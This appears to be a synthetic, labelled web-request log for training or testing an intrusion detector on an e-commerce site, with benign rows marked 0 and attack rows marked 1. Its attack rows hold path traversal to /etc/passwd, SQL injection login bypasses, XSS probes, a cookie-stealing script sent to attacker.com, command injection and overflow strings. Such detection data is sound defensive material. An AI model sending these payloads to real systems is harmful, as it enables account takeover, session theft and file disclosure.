timestamp,ip,method,path,payload,label
07:48:57.5,10.0.0.15,GET,/order/cart,,0
07:48:59.6,10.0.0.106,GET,/product/2,,0
07:49:01.2,203.162.4.191,GET,/../../../../etc/passwd,,1
07:49:03.7,203.162.4.191,GET,/auth/login,,0
07:49:05.7,192.168.1.141,POST,/auth/register,"{'csrf_token': 'ImxPRLpDwxYdCnrLrg1Q7nUObOSVdP5SK25NkRGlfI'.jlj6iWUo.88dgjgE76LjQ5MbFICr_IMzCkVf7, 'username': 'newuser10', 'email': 'a56@b.com', 'password': 'Hhg%e(qA9y%C', 'submit': 'Register'}",0
07:49:07.1,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:49:08.9,203.162.4.190,GET,/../../../../etc/passwd,,1
07:49:11.2,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:49:13.1,192.168.1.175,GET,/auth/login,,0
07:49:15.1,203.162.4.190,GET,/,,0
07:49:17.3,192.168.1.46,GET,/category/Iphone,,0
07:49:19.1,192.168.1.104,POST,/auth/register,"{'csrf_token': 'ImZ8ULnZtFdWsoweJUPEaRSZoTuW1vfqWejjj9Vxi7'.RPaBK12D.PWPLTD3RaDt7vSeD5kwIwl_OdRLC, 'username': 'newuser9', 'email': 'a39@b.com', 'password': 'Bc*a!yx9zbt2', 'submit': 'Register'}",0
07:49:21.7,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:49:22.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:49:25.4,192.168.1.141,POST,/auth/register,"{'csrf_token': 'ImBQiFeZnwTkt9qijYwi1tpAA2k6GlIgQjHNEPFmEu'.8XshSS4w.PDbbeSomVc8Cgol9nm3990fiGVe5, 'username': 'newuser98', 'email': 'a70@b.com', 'password': '$FUf9Ep2PQ^J', 'submit': 'Register'}",0
07:49:27.3,10.0.0.106,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:49:29.5,10.0.0.66,GET,/auth/register,,0
07:49:31.5,192.168.1.56,POST,/search,{'query': 'iphone 15 pro max'},0
07:49:33.3,203.162.4.191,GET,/product/1' AND 1=1,,1
07:49:35.1,192.168.1.55,GET,/,,0
07:49:37.1,192.168.1.104,GET,/auth/login,,0
07:49:39.2,192.168.1.56,POST,/search,{'query': 'iphone 15 pro max'},0
07:49:41.1,192.168.1.50,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:49:43.1,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:49:44.9,203.162.4.190,GET,/../../../../etc/passwd,,1
07:49:47.0,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:49:49.4,192.168.1.22,POST,/auth/login,"{'csrf_token': 'ImrLr5pljXLm4v8CFnziNhKiAuwj6OFS1u8zJQzidf'.EAiRlmE1.jYM99gvaZUKryYR4u7TppirOcyb_, 'username': 'user12', 'password': 'fTb@t5r4TqCW', 'submit': 'Log in'}",0
07:49:51.4,192.168.1.55,POST,/auth/login,"{'csrf_token': 'ImTq8HhlgaHtCRIz2aEqLvAo74FP0EJdIqfPUanDrB'.D4xwfNow.v2H-elJNr-2Lci6fdfXBnFjIkQaK, 'username': 'user22', 'password': 'zQr)W0f&DBTQ', 'submit': 'Log in'}",0
07:49:52.9,10.0.0.195,GET,/order/myorders,,0
07:49:55.2,192.168.1.169,GET,/,,0
07:49:57.3,103.75.118.228,GET,/product/1' AND 1=1,,1
07:49:58.9,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:50:01.0,10.0.0.106,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:50:02.8,10.0.0.67,GET,/order/myorders,,0
07:50:04.9,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:50:07.6,10.0.0.66,POST,/auth/login,"{'csrf_token': 'Im3x9vGRD6ha7DBO4b86DWyI9NLf9ZNbXYc7vNbMXy'.JSAWImpP.QxzBGOyGezUtkVm7VsqR01ys7vJO, 'username': 'user30', 'password': 'xq5Jo$*hlh5A', 'submit': 'Log in'}",0
07:50:09.1,192.168.1.56,GET,/auth/logout,,0
07:50:11.4,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:50:12.8,10.0.0.195,POST,/auth/login,"{'csrf_token': 'ImvcbuCtafni6XROriRyhBmgUj6NnBjTVGHBJf1X8a'.3pUueytu.wllMmGO8Y-hBt9n6qHh3wnuBTGn2, 'username': 'user100', 'password': 'a$bDteLbXStS', 'submit': 'Log in'}",0
07:50:15.2,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:50:17.2,10.0.0.66,GET,/order/myorders,,0
07:50:18.8,103.75.118.228,GET,/product/1' AND 1=1,,1
07:50:21.4,10.0.0.176,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:50:23.4,103.75.118.228,GET,/../../../../etc/passwd,,1
07:50:25.5,192.168.1.175,GET,/product/1,,0
07:50:27.2,10.0.0.79,GET,/product/2,,0
07:50:28.8,203.162.4.190,GET,/../../../../etc/passwd,,1
07:50:31.6,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:50:33.6,192.168.1.12,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:50:35.6,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:50:37.3,103.75.118.228,GET,/../../../../etc/passwd,,1
07:50:39.2,10.0.0.176,POST,/auth/register,"{'csrf_token': 'Im1ft6e9buqettjaiO9vno1PFDI92MPpNcmfPjpp7u'.yxixy1d1.S6HShy-sbP_pQ0KfODmEOIwJ2p8g, 'username': 'newuser18', 'email': 'a6@b.com', 'password': 'FlRfXe3O8@ja', 'submit': 'Register'}",0
07:50:41.6,192.168.1.151,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:50:43.2,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:50:45.7,192.168.1.182,POST,/search,{'query': 'iphone 15 pro max'},0
07:50:47.5,192.168.1.28,POST,/auth/register,"{'csrf_token': 'ImnrC5nfYjs3i3NAE1FGVj4iedGWB3sRLStuDbG62F'.jmnZbIC5.OZe0TNbQF5zcuqWthBZKOih_3fIn, 'username': 'newuser20', 'email': 'a98@b.com', 'password': '7qNbLOVT5^Qq', 'submit': 'Register'}",0
07:50:49.3,203.162.4.191,GET,/product/1' AND 1=1,,1
07:50:51.4,10.0.0.176,POST,/auth/login,"{'csrf_token': 'ImORnBKovWo5xqNeSIxJlHfhhKTQEsu1tjS3XQcxXS'.l0eGRGDy.QEO2u6x7ldCVfzHtH_AT066F7u_5, 'username': 'user91', 'password': 'C*y3Wp6zpcLs', 'submit': 'Log in'}",0
07:50:53.3,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImZkPsUw0PpOpPpRfEQWMvGvHS3RkkB6dULnIKwD9Y'.6RfDeg0U.b7JSZsjQe16Rk9jvGvB6XgdUSpcv, 'username': 'user95', 'password': '9JGXu8nJCShe', 'submit': 'Log in'}",0
07:50:55.4,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:50:57.3,192.168.1.55,POST,/auth/register,"{'csrf_token': 'ImyBCHHHrB4pmwsY2eQTrZTadsBmRsoZR6Fg4rWBrP'.RtXrLSAu.HWUfxcurX5PsIU4wAzQhHxFY7mbJ, 'username': 'newuser33', 'email': 'a20@b.com', 'password': 't4uo$DPI!bOl', 'submit': 'Register'}",0
07:50:59.4,192.168.1.165,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:51:01.2,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:51:03.3,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:51:04.8,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:51:06.8,192.168.1.182,GET,/order/myorders,,0
07:51:09.6,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:51:10.9,203.162.4.190,GET,/,,0
07:51:13.6,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:51:15.2,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:51:17.0,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:51:19.0,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:51:21.5,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:51:23.7,192.168.1.182,GET,/auth/login,,0
07:51:25.2,127.0.0.1,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:51:27.6,192.168.1.151,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:51:29.4,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:51:31.7,127.0.0.1,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:51:33.6,192.168.1.50,GET,/auth/register,,0
07:51:35.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:51:37.0,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:51:39.0,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:51:40.8,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
07:51:42.9,203.162.4.191,GET,/../../../../etc/passwd,,1
07:51:45.4,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:51:46.8,192.168.1.144,POST,/auth/login,"{'csrf_token': 'ImKiF1l5fCJ9gBKVyHLAVqsu2YC9OUzSQm8cKHwViN'.LYi16epI.Pj1jTzUxC2UOMyf3oVOyUBoI4qf3, 'username': 'user41', 'password': ')XfZP^*jUx)4', 'submit': 'Log in'}",0
07:51:49.0,192.168.1.144,POST,/auth/login,"{'csrf_token': 'ImRGg0HxSiI5gXfdXuvXAqmR2AbRpzkRN1O5aoUTO2'.itSYnYSC.Dqn5oTr8RhEevz8zvFMEBoi5yJlo, 'username': 'user24', 'password': 'XQELDvtHD%$M', 'submit': 'Log in'}",0
07:51:51.3,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:51:53.0,192.168.1.46,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:51:55.2,10.0.0.15,GET,/,,0
07:51:57.4,203.162.4.190,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:51:59.1,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:52:01.2,192.168.1.141,GET,/auth/register,,0
07:52:03.2,192.168.1.167,POST,/auth/login,"{'csrf_token': 'Img21DXtK6GZeRWL3WyWS7Fatc1wFwKrXdvazaCa76'.S0V0DjHo.VUKVEeYnxWYvfwyHr8mH-EAc6Yyl, 'username': 'user71', 'password': 'fty($Kh*SIdT', 'submit': 'Log in'}",0
07:52:04.8,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
07:52:07.5,192.168.1.197,GET,/auth/logout,,0
07:52:09.4,10.0.0.79,GET,/product/1,,0
07:52:11.0,203.162.4.191,GET,/product/1' AND 1=1,,1
07:52:13.3,10.0.0.28,GET,/product/1,,0
07:52:15.7,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:52:16.8,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:52:19.5,10.0.0.66,GET,/product/2,,0
07:52:21.2,10.0.0.66,GET,/category/Iphone,,0
07:52:23.7,203.162.4.190,GET,/product/1' AND 1=1,,1
07:52:25.7,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:52:27.4,192.168.1.141,GET,/auth/login,,0
07:52:29.5,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:52:31.1,10.0.0.195,GET,/product/1,,0
07:52:33.6,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:52:35.1,203.162.4.191,GET,/auth/register,,0
07:52:37.5,103.75.118.228,GET,/product/1' AND 1=1,,1
07:52:39.7,192.168.1.104,GET,/auth/logout,,0
07:52:40.9,192.168.1.162,POST,/auth/register,"{'csrf_token': 'ImfVkjhhQLRRg40SYVNwV3ZZ9YxmkLFzCVxTQ1FpC9'.fPzRVGSL.c7od1peCfL-FMN8zg0zBPdqe31u0, 'username': 'newuser29', 'email': 'a1@b.com', 'password': 'CwwF^1bR6@0T', 'submit': 'Register'}",0
07:52:43.0,192.168.1.55,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:52:44.9,127.0.0.1,POST,/auth/register,"{'csrf_token': 'Im2fN1fDAJiaWMrhr2chffbo9E9uZKqZWGZwTiljR7'.hSPCZHTM.MUTKFSqaXC8TK9HPbeEBTIikI_uB, 'username': 'newuser6', 'email': 'a50@b.com', 'password': '2NcWcO4))aNG', 'submit': 'Register'}",0
07:52:47.7,127.0.0.1,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:52:49.7,192.168.1.12,GET,/order/myorders,,0
07:52:51.4,103.75.118.228,GET,/../../../../etc/passwd,,1
07:52:53.2,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:52:55.5,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:52:56.9,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:52:59.0,192.168.1.182,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:53:01.1,192.168.1.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:53:03.5,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:53:04.8,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:53:06.8,203.162.4.190,GET,/product/1' AND 1=1,,1
07:53:08.8,10.0.0.106,POST,/auth/login,"{'csrf_token': 'ImVY7VuegE25GMyNjxG3ujnF5w8LEgQcAGhpDLS9nW'.EZ2FBbxA.bW8j9PmAi9N44u95-oqwWaDKuldV, 'username': 'user37', 'password': 'b*IytQJ2A*3U', 'submit': 'Log in'}",0
07:53:11.1,203.162.4.190,GET,/order/cart,,0
07:53:13.6,10.0.0.66,GET,/category/Iphone,,0
07:53:15.7,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:53:17.7,10.0.0.28,GET,/product/2,,0
07:53:19.7,10.0.0.106,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:53:21.6,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:53:23.5,10.0.0.195,POST,/auth/login,"{'csrf_token': 'ImrGRlcOu6sjnxAY2ToAtlerLCLXEDDXM8E57lHFOm'.Tm0Rfiy1.QDgNasalneCo3LLLbAfwzkGofaES, 'username': 'user47', 'password': 'eSOB^UGv@L0G', 'submit': 'Log in'}",0
07:53:25.1,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:53:27.7,192.168.1.46,GET,/auth/register,,0
07:53:29.3,203.162.4.191,GET,/../../../../etc/passwd,,1
07:53:31.6,192.168.1.141,POST,/auth/login,"{'csrf_token': 'ImkqWxLHgCyKWRonlejVCb0ErfAcTR4aiUahrrJV8y'.pRLlC4va.5MU9dvvUQ5whaUhhVG-Dy_ZEpBqY, 'username': 'user1', 'password': 'oOBSEqGxrG2B', 'submit': 'Log in'}",0
07:53:33.6,192.168.1.50,POST,/auth/login,"{'csrf_token': 'Im5CAZGVtxdniaM9CAE0aR4EQJgafqBI5Aocf8l5XF'.KchwxQsQ.5TQGUTAqF8NOyIOFdHnBUYI29Fdr, 'username': 'user7', 'password': '#tfL39D&tKs2', 'submit': 'Log in'}",0
07:53:34.8,10.0.0.146,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:53:37.1,192.168.1.144,GET,/product/2,,0
07:53:38.8,192.168.1.175,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:53:40.8,192.168.1.182,GET,/,,0
07:53:43.6,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:53:45.3,192.168.1.46,POST,/auth/register,"{'csrf_token': 'ImtMGt85dmFL4K0Gc5qyFvbHL0d84fabMN92I6krQA'.9NVJ062c.Jjd6oDcA7FjrFOUE0OJxelQNvEos, 'username': 'newuser58', 'email': 'a52@b.com', 'password': '4e7hhXA5kWji', 'submit': 'Register'}",0
07:53:47.6,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:53:48.8,192.168.1.144,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:53:51.5,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:53:53.1,10.0.0.146,GET,/auth/register,,0
07:53:55.4,192.168.1.197,GET,/,,0
07:53:57.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:53:59.0,10.0.0.15,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:54:01.7,192.168.1.167,GET,/product/1,,0
07:54:02.9,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:54:05.4,10.0.0.67,POST,/search,{'query': 'iphone 15 pro max'},0
07:54:07.3,10.0.0.15,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:54:09.7,192.168.1.197,GET,/,,0
07:54:11.6,10.0.0.176,GET,/product/1,,0
07:54:13.2,10.0.0.28,GET,/auth/login,,0
07:54:15.1,192.168.1.22,POST,/auth/login,"{'csrf_token': 'ImshlNcrBx6fmwe2f3Za9u9esTUJXs0ukY0jevwr9q'.61uZDGqu.W45nuXhJsUha1o00aR8cYM0oH8kY, 'username': 'user99', 'password': 'Y^iM&ip6Gopf', 'submit': 'Log in'}",0
